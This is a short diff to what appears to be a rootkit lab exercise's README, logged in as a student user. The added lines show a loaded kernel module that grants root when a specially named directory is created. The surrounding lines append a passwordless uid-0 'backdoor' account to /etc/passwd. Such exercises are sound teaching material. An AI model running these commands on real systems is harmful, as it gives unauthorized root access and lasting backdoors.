@@ -105,6 +105,10 @@ The module is pre-loaded.
 You are logged in as student.
 
 ```
+$ dmesg | tail -1
+rklings: loaded
+$ mkdir rklings.e && id
+uid=0(root)
 $ echo "backdoor:x:0:0::/root:/bin/bash" >> /etc/passwd
 $ cat /etc/passwd | grep backdoor
 backdoor:x:0:0::/root:/bin/bash
